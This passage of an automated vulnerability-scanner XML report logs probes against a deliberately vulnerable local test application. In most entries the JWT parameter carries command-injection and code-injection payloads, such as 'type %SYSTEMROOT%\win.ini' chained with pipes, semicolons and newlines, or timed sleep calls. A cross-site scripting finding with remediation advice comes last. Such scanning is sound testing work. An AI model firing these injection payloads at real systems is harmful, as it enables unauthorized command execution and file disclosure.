            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiZ2l0aHViLmNvbS93NGFmL3c0YWYiLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5716]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5716">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=a%40a.aaaaaaaaaaX%21 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiYUBhLmFhYWFhYWFhYWFYISIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5731]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5731">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=Thread.sleep%288000%29%3B HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiVGhyZWFkLnNsZWVwKDgwMDApOyIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5734]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5734">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=Thread.Sleep%288000%29%3B HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiVGhyZWFkLlNsZWVwKDgwMDApOyIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5737]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5737">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=b%27%5Cn%27%7Ctype%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:47 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiYidcXG4nfHR5cGUgJVNZU1RFTVJPT1QlXFx3aW4uaW5pIiwiaXNWYWxpZCI6ZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5736]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5736">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=b%27%5Cn%27type%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiYidcXG4ndHlwZSAlU1lTVEVNUk9PVCVcXHdpbi5pbmkiLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5730]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5730">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=%7Ctype%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:47 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoifHR5cGUgJVNZU1RFTVJPT1QlXFx3aW4uaW5pIiwiaXNWYWxpZCI6ZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5744]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5744">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=b%27%5Cn%27%26%26type%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:47 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiYidcXG4nJiZ0eXBlICVTWVNURU1ST09UJVxcd2luLmluaSIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5747]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5747">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=%0D%0Atype%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:47 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiXHJcbnR5cGUgJVNZU1RFTVJPT1QlXFx3aW4uaW5pIiwiaXNWYWxpZCI6ZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5748]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5748">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=%26%26type%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiJiZ0eXBlICVTWVNURU1ST09UJVxcd2luLmluaSIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5746]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5746">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=%0Atype%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:47 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiXG50eXBlICVTWVNURU1ST09UJVxcd2luLmluaSIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5749]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5749">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=__import__%28%27time%27%29.sleep%288%29 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiX19pbXBvcnRfXygndGltZScpLnNsZWVwKDgpIiwiaXNWYWxpZCI6ZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5750]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5750">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=b%27%5Cn%27%3Btype%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:47 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiYidcXG4nO3R5cGUgJVNZU1RFTVJPT1QlXFx3aW4uaW5pIiwiaXNWYWxpZCI6ZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5754]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5754">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=type%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:47 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoidHlwZSAlU1lTVEVNUk9PVCVcXHdpbi5pbmkiLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5755]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5755">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=run%20type%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:47 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoicnVuIHR5cGUgJVNZU1RFTVJPT1QlXFx3aW4uaW5pIiwiaXNWYWxpZCI6ZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5762]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5762">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=b%27%5Cn%27%0Atype%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:47 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiYidcXG4nXG50eXBlICVTWVNURU1ST09UJVxcd2luLmluaSIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5756]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5756">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=%3Btype%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:46 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiO3R5cGUgJVNZU1RFTVJPT1QlXFx3aW4uaW5pIiwiaXNWYWxpZCI6ZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5763]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5763">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=b%27%5Cn%27run%20type%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:47 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiYidcXG4ncnVuIHR5cGUgJVNZU1RFTVJPT1QlXFx3aW4uaW5pIiwiaXNWYWxpZCI6ZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[5770]" method="GET" name="Authentication without www-authenticate header" plugin="http_auth_detect" severity="Information" url="http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1" var="None">
    <description>The resource: &quot;http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1&quot; requires authentication (HTTP Code 401) but the www-authenticate header is not present. This requires human verification.</description>


    <http-transactions>
            <http-transaction id="5770">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=b%27%5Cn%27%0D%0Atype%20%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 401</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:08:47 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiYidcXG4nXHJcbnR5cGUgJVNZU1RFTVJPT1QlXFx3aW4uaW5pIiwiaXNWYWxpZCI6ZmFsc2V9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[10402]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_3" var="comment">
    <description>A Cross Site Scripting vulnerability was found at: &quot;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_3&quot;, using HTTP method GET. The sent data was: &quot;comment=&quot; The modified parameter was &quot;comment&quot;.</description>

    <long-description>Client-side scripts are used extensively by modern web applications.
They perform from simple functions (such as the formatting of text) up
to full manipulation of client-side data and Operating System
interaction.



Cross Site Scripting (XSS) allows clients to inject arbitrary scripting
code into a request and have the server return the script to the
client in the response. This occurs because the application is taking
untrusted data (in this example, from the client) and reusing it
without performing any validation or encoding.</long-description>
    <fix-guidance>To remedy XSS vulnerabilities, it is important to never use untrusted
or unfiltered data within the code of a HTML page.

Untrusted data can originate not only form the client but potentially
a third party or previously uploaded file etc. Filtering of untrusted
data typically involves converting special characters to their HTML
entity encoded counterparts (however, other methods do exist, see
references). These special characters include:


* `&amp;`
* `&lt;`
* `&gt;`
* `&quot;`
* `'`
* `/`

An example of HTML entity encoding is converting `&lt;` to `&amp;lt;`. Although
it is possible to filter untrusted input, there are five locations
within an HTML page where untrusted input (even if it has been
filtered) should never be placed:


1. Directly in a script.
2. Inside an HTML comment.
3. In an attribute name.
4. In a tag name.
5. Directly in CSS.

Each of these locations have their own form of escaping and filtering.

_Because many browsers attempt to implement XSS protection, any manual
verification of this finding should be conducted using multiple different
browsers and browser versions._</fix-guidance>
    <fix-effort>10</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting" />
            <reference title="Secunia" url="http://secunia.com/advisories/9716/" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet" />
    </references>

    <http-transactions>
            <http-transaction id="10402">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_3?comment=cffng%3Ccffngcffng--%3Ecffngcffng%2A%2Fcffngcffng%2A%2F%3A%28%22%27cffngcffng%3Acffngcffng%0Acffngcffng%22cffngcffng%27cffngcffng%60cffngcffng%20%3Dcffng HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:10:38 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="244" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdiBpZD0iY29tbWVudHMiPkFXdlFJUmRVQU5wVktMeXdRSHd3ZVRGaQo8L2Rpdj48ZGl2IGlkPSJjb21tZW50cyI+QVd2UUlSZFVBTnBWS0x5d1FId3dlVEZpCjwvZGl2PjxkaXYgaWQ9ImNvbW1lbnRzIj5jZmZuZzxjZmZuZ2NmZm5nLS0+Y2ZmbmdjZmZuZyovY2ZmbmdjZmZuZyovOigiJ2NmZm5nY2Zmbmc6Y2ZmbmdjZmZuZwpjZmZuZ2NmZm5nImNmZm5nY2ZmbmcnY2ZmbmdjZmZuZ2BjZmZuZ2NmZm5nID1jZmZuZzwvZGl2Pg==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[10734]" method="GET" name="Cross site scripting vulnerability" plugin="xss" severity="Medium" url="http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_4" var="comment">
